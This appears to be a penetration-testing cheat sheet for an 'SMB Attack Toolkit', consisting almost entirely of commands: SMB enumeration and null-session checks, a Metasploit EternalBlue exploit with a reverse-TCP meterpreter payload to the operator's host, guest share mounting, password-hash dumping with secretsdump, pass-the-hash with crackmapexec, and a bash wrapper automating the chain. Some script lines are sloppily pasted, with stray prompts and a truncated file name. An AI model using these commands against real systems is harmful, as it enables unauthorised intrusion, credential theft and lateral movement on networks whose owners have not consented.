~/smb-toolkit/
├── smb_toolkit.sh
├── sid_brute.sh
├── mount_share.sh
├── eternalblue.rc
└── creds.txt
# nmap + NSE Scripts
bash

$ nmap -p 445 --script smb-os-discovery,smb-enum-users,smb-enum-shares,smb-enum-domains <target>
# Wrap in a Bash script:

bash

#!/bin/bash
$ target=$1
$ echo "[*] Running SMB enumeration on $target..."
$ nmap -p 445 --script "smb-os-discovery,smb-enum-users,smb-enum-shares" $target -oN smb_enum_$targ
# enum4linux-ng -A <target> | tee enum4_$target.txt
 # smbclient
bash

$ smbclient -L //<target> -N

$ smbclient //target/share -N

# EternalBlue (CVE-2017-0144) – Only for XP/2003/Win7
bash
$ msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run
# Exposed SMB shares (manual dump)
Mounting:

bash
mount -t cifs //target/share /mnt/smb -o guest
Automate with:

bash
# !/bin/bash
$ mkdir -p /mnt/smb
mount -t cifs //$1/$2 /mnt/smb -o guest
ls /mnt/smb
# Dumping Password Policy
bash

polenum --target <target>
# Extracting Hashes from SAM (if access gained)
bash

secretsdump.py -just-dc -no-pass <DOMAIN>/<USER>@<IP>
# Pass-the-Hash via crackmapexec
bash

crackmapexec smb <target> -u Administrator -H <NTLM_HASH>

# Toolkit Automation Wrapper
You can glue all this together in a main script like smb_toolkit.sh:

bash

#!/bin/bash

target=$1
lhost=$2
echo "[*] Starting SMB Attack Toolkit against $target"

# Enumeration
nmap -p 445 --script smb-os-discovery,smb-enum-users,smb-enum-shares $target -oN enum_nmap_$target.txt
enum4linux-ng -A $target | tee enum4_$target.txt

# Test for Null session share mount
smbclient -L //$target -N | tee smbclient_$target.txt

# Optional: EternalBlue (MS17-010)
echo "[*] Launching MS17-010 check..."
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $target; run; exit"

echo "[*] Finished."